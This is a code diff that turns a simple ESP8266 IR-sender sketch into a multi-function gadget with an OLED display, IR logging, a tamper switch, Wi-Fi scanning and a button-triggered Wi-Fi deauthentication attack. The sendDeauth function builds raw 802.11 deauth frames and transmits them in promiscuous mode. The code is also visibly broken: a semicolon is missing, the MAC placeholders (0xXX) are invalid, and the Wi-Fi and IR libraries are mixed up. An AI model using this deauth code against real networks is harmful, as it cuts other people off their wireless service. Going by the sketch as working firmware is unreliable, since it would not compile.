@@ -1,25 +1,197 @@
-#include <IRremoteESP8266.h>
-#include <IRsend.h>
+#include <ESP8266WiFi.h> // Use WiFi.h for ESP32
+#include <IRremote.h>
+#include <Wire.h>
+#include <Adafruit_SSD1306.h>
+#include <WiFi.h>
 
-const uint16_t kIrLedPin = 4; // GPIO4 (D4 on some boards)
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_RESET    -1
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
-IRsend irsend(kIrLedPin);
+const int irSendPin = 9;
+const int irReceivePin = 10
+IRsend irsend(irSendPin);
+IRrecv irrecv(irReceivePin);
+decode_results results;
+
+const int buttonPin = 2;
+const int tamperPin = 3;
+bool lastButtonState = LOW;
+
+unsigned long previousMillis = 0;
+int fps = 0;
 
 void setup() {
- 
-  Serial.begin(115200);
+    Serial.begin(115200);
+    Serial.println("Setup started");
+    
+    irsend.begin();
+    irrecv.enableIRIn();
+    pinMode(buttonPin, INPUT);
+    pinMode(tamperPin, INPUT_PULLUP);
 
-  irsend.begin();
-  Serial.println("IR Sender ready!");
+    // Initialize the display
+    if(!display.begin(SSD1306_I2C_ADDRESS, OLED_RESET)) {
+        Serial.println(F("SSD1306 allocation failed"));
+        for(;;);
+    }
+
+    display.clearDisplay();
+    display.display();
+    
+    // Initialize Wi-Fi
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(1);
+    Serial.println("Attempting WiFi connection");
+    WiFi.begin(); // Attempt to connect to any available network
+    
+    // Set promiscuous mode for sending raw packets
+    wifi_set_opmode(STATION_MODE);
+    wifi_promiscuous_enable(true);
+    
+    Serial.println("Setup completed");
 }
 
 void loop() {
+    unsigned long currentMillis = millis();
+    
+    // Calculate FPS
+    if (currentMillis - previousMillis > 1000) {
+        fps = 1000 / (currentMillis - previousMillis);
+        previousMillis = currentMillis;
 
-  unsigned int data = 0x20DF10EF;  
-  irsend.sendNEC(data, 32);        
+        displayFPS(fps); // Display FPS on the OLED
+    }
 
-  Serial.println("IR Signal Sent");
-  
-  
-  delay(1);
+    Serial.println("Loop started");
+
+    // Check for tampering
+    if (digitalRead(tamperPin) == LOW) {
+        displayMessage("Tamper Alert!", 2000);
+        Serial.println("Tamper Alert: Device has been opened!");
+        while (true);
+    }
+
+    // Monitor IR signals
+    if (irrecv.decode(&results)) {
+        logIRSignal(results.value);
+        irrecv.resume();
+    }
+
+    // Button functionality
+    handleButtonPress();
+
+    // Scan for available Wi-Fi networks
+    scanWiFiNetworks();
+
+ 
+    bool buttonState = digitalRead(buttonPin);
+    if (buttonState == HIGH && lastButtonState == LOW) {
+        uint8_t targetMAC[] = {0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX};
+        uint8_t apMAC[] = {0xYY, 0xYY, 0xYY, 0xYY, 0xYY, 0xYY};
+        sendDeauth(targetMAC, apMAC); // Send Deauth packet
+    }
+    lastButtonState = buttonState;
+
+    Serial.println("Loop completed");
+}
+
+void sendDeauth(const uint8_t *targetMAC, const uint8_t *apMAC) {
+    uint8_t deauthPacket[26] = {
+        0xc0, 0x00,             // Type: Management, Subtype: Deauth
+        0x3a, 0x01,            
+        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5],
+        targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
+        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5],  // BSSID (AP's MAC)
+        0x00, 0x00,             
+        0x07, 0x00              // Reason code: 0x07 = "Class 3 frame received from nonassociated STA"
+    };
+
+    // Send the deauth packet
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    Serial.println("Deauth packet sent.");
+}
+
+void handleButtonPress() {
+    bool buttonState = digitalRead(buttonPin);
+    
+    // Send IR signal on button press
+    if (buttonState == HIGH && lastButtonState == LOW) {
+        unsigned long irSignal = 0x20DF10EF;
+        irsend.sendNEC(irSignal, 32);
+        displayMessage("IR Signal Sent!", 2000);
+        Serial.println("IR Signal Sent");
+    }
+    
+    lastButtonState = buttonState;
+}
+
+void logIRSignal(unsigned long signal) {
+    // Simple logging to Serial Monitor
+    Serial.print("IR Signal Detected: ");
+    Serial.println(signal, HEX);
+
+    // Display a message on the OLED
+    displayMessage("IR Detected!", 2000);
+}
+
+void scanWiFiNetworks() {
+    Serial.println("Scanning Wi-Fi networks");
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    display.print("Scanning Wi-Fi...\n");
+
+    int n = WiFi.scanNetworks();
+    if (n == 0) {
+        display.print("No networks found.");
+        Serial.println("No Wi-Fi networks found");
+    } else {
+        display.print(n);
+        display.print(" networks found:\n");
+        Serial.print(n); // Debugging message
+        Serial.println(" Wi-Fi networks found");
+        for (int i = 0; i < n; i++) {
+            display.print(WiFi.SSID(i));
+            display.print(" (");
+            display.print(WiFi.RSSI(i));
+            display.print("dBm)\n");
+
+            Serial.print("Network: ");
+            Serial.print(WiFi.SSID(i));
+            Serial.print(" (Signal: ");
+            Serial.print(WiFi.RSSI(i));
+            Serial.println(" dBm)");
+        }
+    }
+
+    display.display();
+    delay(1);
+}
+
+void displayFPS(int fps) {
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    display.print("FPS: ");
+    display.print(fps);
+    display.display();
+
+    Serial.print("FPS: ");
+    Serial.println(fps);
+}
+
+void displayMessage(String message, int duration) {
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    display.print(message);
+    display.display();
+    Serial.println("Displaying message: " + message);
+    delay(duration);
 }
